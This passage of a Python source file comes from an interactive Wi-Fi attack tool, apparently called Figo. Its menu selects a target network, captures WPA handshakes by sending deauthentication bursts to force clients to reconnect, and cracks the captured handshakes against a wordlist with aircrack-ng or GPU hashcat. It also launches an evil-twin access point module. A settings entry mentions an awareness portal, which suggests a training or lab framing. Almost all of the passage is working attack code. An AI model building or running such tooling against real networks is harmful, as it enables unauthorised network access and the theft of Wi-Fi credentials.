                                    burst,
                                    captured,
                                    capfile,
                                    note,
                                )
                            )
                            break
                        last_hs_check = elapsed
                        note = (
                            f"Deauth burst {burst}/{DEAUTH_BURSTS}"
                            if burst <= DEAUTH_BURSTS
                            else "Waiting for a client to reconnect..."
                        )
                    time.sleep(0.4)
                if captured:
                    break

        stop_airodump(dump_proc)
        dump_proc = None
        capfile = capfile or latest_cap(prefix)

        console.print("[dim]Restoring adapter / NetworkManager...[/dim]")
        stop_monitor(mon, base_iface)
        restored = True

        if not captured:
            extra = f"\nCapture file kept at:\n{capfile}" if capfile else ""
            warn_and_back(
                "No handshake captured",
                "Timed out before a WPA handshake was seen.\n"
                "No client reconnected, or the signal is too weak."
                + extra,
            )
            return

        console.print(
            Panel(
                f"Handshake saved:\n[bold]{capfile}[/bold]\n\n"
                "Use [bold]7 — Crack a saved handshake[/bold] to test the wordlist.",
                title="Capture complete",
                border_style="green",
                box=box.ROUNDED,
            )
        )
        pause()
    except KeyboardInterrupt:
        console.print("\n[yellow]Capture cancelled.[/yellow]")
    finally:
        stop_airodump(dump_proc)
        if not restored:
            console.print("[dim]Restoring adapter / NetworkManager...[/dim]")
            stop_monitor(mon, base_iface)


def action_crack_saved(settings: Settings) -> None:
    if not require_bins(("aircrack-ng",)):
        return
    if not require_wordlist(settings):
        return

    handshake_dir = Path(settings.handshake_dir or DEFAULT_HANDSHAKE_DIR)
    caps = list_cap_files(handshake_dir)
    if not caps:
        warn_and_back(
            "No capture files",
            f"No .cap / .pcap files found in:\n{handshake_dir}\n\n"
            "Run [bold]6 — Capture handshake[/bold] first.",
        )
        return

    clear_screen()
    render_banner(settings)
    table = Table(box=box.SIMPLE_HEAVY, expand=True)
    table.add_column("#", style="yellow", width=4)
    table.add_column("File", style="cyan")
    table.add_column("Size", justify="right")
    table.add_column("Modified", style="dim")
    for i, path in enumerate(caps, 1):
        mtime = datetime.fromtimestamp(path.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
        table.add_row(str(i), path.name, format_bytes(path.stat().st_size), mtime)
    console.print(Panel(table, title=f"Saved handshakes · {handshake_dir}", border_style="cyan"))
    console.print(f"[dim]Wordlist: {settings.wordlist}[/dim]\n")

    choice = ask("Capture number (Enter to go back)")
    if not choice.strip():
        return
    if not choice.isdigit() or not (1 <= int(choice) <= len(caps)):
        warn_and_back("Invalid choice", "Enter a number from the list.")
        return

    capfile = caps[int(choice) - 1]
    networks = networks_in_cap(capfile)
    with_hs = [n for n in networks if "0 handshake" not in n["line"].lower()]
    candidates = with_hs or networks

    bssid = settings.target.bssid
    if candidates:
        net_table = Table(box=box.SIMPLE, expand=True)
        net_table.add_column("#", style="yellow", width=4)
        net_table.add_column("BSSID")
        net_table.add_column("SSID")
        for i, net in enumerate(candidates, 1):
            net_table.add_row(str(i), net["bssid"], net["ssid"])
        console.print(Panel(net_table, title="Networks in capture", border_style="green"))
        if len(candidates) == 1:
            bssid = candidates[0]["bssid"]
            console.print(f"[dim]Using BSSID {bssid}[/dim]\n")
        else:
            net_choice = ask("Network number (Enter uses saved target)")
            if net_choice.isdigit() and 1 <= int(net_choice) <= len(candidates):
                bssid = candidates[int(net_choice) - 1]["bssid"]
            elif not bssid:
                warn_and_back("BSSID required", "Pick a network from the capture list.")
                return

    use_hashcat = False
    if which_or_none("hashcat"):
        console.print("1  aircrack-ng (CPU)")
        console.print("2  hashcat (GPU)  [default]\n")
        engine = ask("Engine").strip()
        use_hashcat = engine in {"", "2"}
        if engine and engine not in {"1", "2"}:
            warn_and_back("Invalid choice", "Enter 1 or 2.")
            return

    if use_hashcat:
        if not which_or_none("hcxpcapngtool"):
            console.print(
                "[yellow]hcxpcapngtool is missing (needed to convert .cap to hashcat 22000).[/yellow]\n"
                "Install it from menu [bold]5[/bold], or use CPU now.\n"
            )
            if not confirm("Use aircrack-ng (CPU) instead?", default=True):
                return
            use_hashcat = False
        else:
            console.print("[dim]Converting capture to hashcat 22000...[/dim]")
            hashfile, conv_err = cap_to_hc22000(capfile)
            if not hashfile:
                warn_and_back(
                    "Conversion failed",
                    conv_err + "\n\nYou can retry with aircrack-ng (CPU).",
                )
                if not confirm("Use aircrack-ng (CPU) instead?", default=True):
                    return
                use_hashcat = False
            else:
                console.print(f"[green]Hash file:[/green] {hashfile}\n")
                console.print("[dim]Running hashcat on GPU...[/dim]\n")
                key, _out = crack_hashcat(hashfile, settings.wordlist)
                console.print()
                show_crack_result(key, capfile)
                pause()
                return

    console.print("[dim]Running aircrack-ng against the wordlist...[/dim]\n")
    key, _out = crack_capture(capfile, bssid, settings.wordlist)
    console.print()
    show_crack_result(key, capfile)
    pause()


def action_select_interface(settings: Settings) -> None:
    clear_screen()
    render_banner(settings)
    ifaces = wireless_interfaces()
    if not ifaces:
        warn_and_back(
            "No wireless adapter",
            "No wireless interface (wlan) was found.\n"
            "Make sure the adapter is enabled and not blocked by rfkill.",
        )
        return

    table = Table(box=box.SIMPLE_HEAVY, expand=True)
    table.add_column("#", style="yellow", width=4)
    table.add_column("Interface", style="cyan")
    table.add_column("State")
    for i, name in enumerate(ifaces, 1):
        mark = "  <- current" if name == settings.interface else ""
        table.add_row(str(i), name + mark, iface_state(name))
    console.print(Panel(table, title="Wireless adapters", border_style="cyan"))

    choice = ask("Adapter number (or Enter to go back)")
    if not choice.strip():
        return
    if not choice.isdigit() or not (1 <= int(choice) <= len(ifaces)):
        warn_and_back("Invalid choice", "Enter a number from the list.")
        return

    settings.interface = ifaces[int(choice) - 1]
    save_settings(settings)
    console.print(f"\n[green]Adapter selected:[/green] [bold]{settings.interface}[/bold]")
    pause()


def action_select_wordlist(settings: Settings) -> None:
    clear_screen()
    render_banner(settings)
    discovered = discover_wordlists()

    if discovered:
        table = Table(box=box.SIMPLE_HEAVY, expand=True)
        table.add_column("#", style="yellow", width=4)
        table.add_column("File", style="cyan")
        table.add_column("Details", style="dim")
        for i, path in enumerate(discovered, 1):
            mark = "  <- current" if str(path) == settings.wordlist else ""
            table.add_row(str(i), str(path) + mark, wordlist_info(path))
        console.print(Panel(table, title="Discovered wordlists", border_style="cyan"))
        console.print("[dim]Or type a full path to another file.[/dim]\n")

    raw = ask("List number or file path (Enter to go back)").strip()
    if not raw:
        return

    if raw.isdigit() and discovered and 1 <= int(raw) <= len(discovered):
        path = discovered[int(raw) - 1]
    else:
        path = Path(os.path.expanduser(raw)).resolve()

    if not path.is_file():
        warn_and_back("File not found", f"Invalid path or not a file:\n{path}")
        return

    settings.wordlist = str(path)
    save_settings(settings)
    console.print(f"\n[green]Wordlist selected:[/green] [bold]{path}[/bold]")
    console.print(f"[dim]{wordlist_info(path)}[/dim]")
    pause()


def action_discover_and_select_target(settings: Settings) -> None:
    if not require_interface(settings):
        return

    clear_screen()
    render_banner(settings)
    console.print("[dim]Scanning visible networks...[/dim]")
    rows, error = scan_networks(settings.interface)
    if error:
        warn_and_back("Scan failed", error)
        return
    if not rows:
        warn_and_back("No results", "No networks were found on the selected adapter.")
        return

    table = Table(box=box.SIMPLE_HEAVY, expand=True)
    table.add_column("#", style="yellow", width=4)
    table.add_column("SSID")
    table.add_column("BSSID", style="dim")
    table.add_column("CH", justify="right")
    table.add_column("Signal", justify="right")
    table.add_column("Security")
    for i, row in enumerate(rows, 1):
        mark = " <-" if row["bssid"] == settings.target.bssid and settings.target.bssid else ""
        table.add_row(
            str(i),
            row["ssid"] + mark,
            row["bssid"],
            row["channel"],
            row["signal"],
            row["security"],
        )
    console.print(Panel(table, title=f"Networks on {settings.interface}", border_style="green"))

    choice = ask("Target number (Enter to go back)")
    if not choice.strip():
        return
    if not choice.isdigit() or not (1 <= int(choice) <= len(rows)):
        warn_and_back("Invalid choice", "Enter a number from the network list.")
        return

    picked = rows[int(choice) - 1]
    settings.target = Target(
        ssid=picked["ssid"],
        bssid=picked["bssid"],
        channel=picked["channel"],
        signal=picked["signal"],
        security=picked["security"],
    )
    save_settings(settings)
    console.print(
        f"\n[green]Target selected:[/green] [bold]{settings.target.ssid}[/bold] "
        f"[dim]({settings.target.bssid})[/dim]"
    )
    pause()


def action_show_settings(settings: Settings) -> None:
    clear_screen()
    render_banner(settings)
    table = Table(box=box.ROUNDED, expand=True, show_header=False)
    table.add_column("k", style="bold", width=18)
    table.add_column("v")
    table.add_row("Adapter", settings.interface or "[red]not set[/red]")
    table.add_row("Wordlist", settings.wordlist or "[red]not set[/red]")
    if settings.wordlist:
        table.add_row("File details", wordlist_info(Path(settings.wordlist)))
    table.add_row("SSID", settings.target.ssid or "[red]not set[/red]")
    table.add_row("BSSID", settings.target.bssid or "-")
    table.add_row("Channel", settings.target.channel or "-")
    sec = settings.target.security or "-"
    table.add_row("Security", f"[yellow]{sec}[/yellow]" if is_wpa3(sec) else sec)
    table.add_row("Handshake dir", settings.handshake_dir or DEFAULT_HANDSHAKE_DIR)
    portal = settings.portal
    if hasattr(portal, "to_dict"):
        portal = portal.to_dict()
    if not isinstance(portal, dict):
        portal = {}
    table.add_row("Awareness portal", "enabled" if portal.get("enabled", True) else "disabled")
    if portal.get("organization"):
        table.add_row("Organization", str(portal.get("organization")))
    table.add_row("Config file", str(CONFIG_FILE))
    console.print(table)
    pause()


def _evil_twin_api():
    """Adapter so figolab can reuse Figo UI helpers without a circular import graph."""
    from types import SimpleNamespace

    return SimpleNamespace(
        BackToMenu=BackToMenu,
        ask=ask,
        confirm=confirm,
        pause=pause,
        warn_and_back=warn_and_back,
        clear_screen=clear_screen,
        require_interface=require_interface,
        scan_networks=scan_networks,
        save_settings=save_settings,
        ensure_root=ensure_root,
    )


def action_evil_twin(settings: Settings) -> None:
    from figolab.evil_twin import action_evil_twin_lab

    action_evil_twin_lab(settings, _evil_twin_api())


def main(argv: Optional[list[str]] = None) -> int:
    argv = list(sys.argv[1:] if argv is None else argv)
    resume = ""
    for arg in argv:
        if arg.startswith("--resume="):
            resume = arg.split("=", 1)[1]

    settings = load_settings()
    try:
        if resume == "capture":
            action_capture(settings)
        elif resume == "crack":
            action_crack_saved(settings)
        elif resume == "install":
            action_install_tools()
        elif resume == "evil_twin":
            action_evil_twin(settings)
    except BackToMenu:
        pass
    except KeyboardInterrupt:
        console.print("\n[dim]Goodbye.[/dim]")
        return 0

    while True:
        try:
            clear_screen()
            render_banner(settings)
            render_menu(settings)
            choice = ask("Choose a number", exit_on_interrupt=True).strip()
            if choice == "1":
                action_select_interface(settings)
            elif choice == "2":
                action_discover_and_select_target(settings)
            elif choice == "3":
                action_select_wordlist(settings)
            elif choice == "4":
                action_show_settings(settings)
            elif choice == "5":
                action_install_tools()
            elif choice == "6":
                action_capture(settings)
            elif choice == "7":
                action_crack_saved(settings)
            elif choice == "8":
                action_evil_twin(settings)
            else:
                warn_and_back("Unknown option", "Use 1–8. Ctrl+C to exit.")
        except BackToMenu:
            continue
        except KeyboardInterrupt:
            console.print("\n[dim]Goodbye.[/dim]")
            return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        console.print("\n[dim]Goodbye.[/dim]")
        raise SystemExit(0)
